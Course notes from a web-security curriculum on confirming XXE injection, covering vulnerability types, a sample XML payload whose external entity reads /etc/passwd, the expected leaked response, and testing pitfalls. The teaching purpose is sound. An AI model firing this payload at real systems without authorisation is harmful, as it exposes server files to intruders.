---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## Confirming XXE Vulnerabilities

### Types of XXE Injection

Once you have identified potential instances where client-supplied input is being processed as XML code, the next step is to test those instances to confirm that they are truly vulnerable. There are several types of XXE injection vulnerabilities:

1. **In-Band XXE**: The attacker can retrieve the contents of a file directly from the server.
2. **Blind XXE**: The attacker cannot directly retrieve the contents of a file but can infer information based on the server's response.
3. **Out-of-Band XXE**: The attacker can exfiltrate data to an external server controlled by them.

### Testing In-Band XXE

To test for in-band XXE, you would attempt to output the content of a world-readable file from the server where the application is installed. For example, you could try to read the `/etc/passwd` file on a Unix-based system.

#### Example Payload

Here is an example payload that attempts to read the `/etc/passwd` file:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

#### Expected Response

If the application is vulnerable to in-band XXE, the response might look something like this:

```http
HTTP/1.1 200 OK
Content-Type: text/xml

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

### Common Pitfalls

When testing for XXE vulnerabilities, it is important to consider the following pitfalls:

1. **Input Validation**: Ensure that the input validation mechanisms are bypassed or that the validation is weak enough to allow the injection of XML entities.
2. **Error Handling**: Pay attention to how the application handles errors. Some applications may suppress error messages, making it harder to detect XXE vulnerabilities.
3. **File Permissions**: Not all files are readable by the application. Ensure that the file you are trying to read is accessible to the application.

---
<!-- nav -->
[[12-Background on XML Entities and DTDs|Background on XML Entities and DTDs]] | [[Web Security (PortSwigger)/08-XXE Injection/01-XXE Injection Complete Guide/00-Overview|Overview]] | [[14-Detailed Example Online Store Check Stock Functionality|Detailed Example Online Store Check Stock Functionality]]
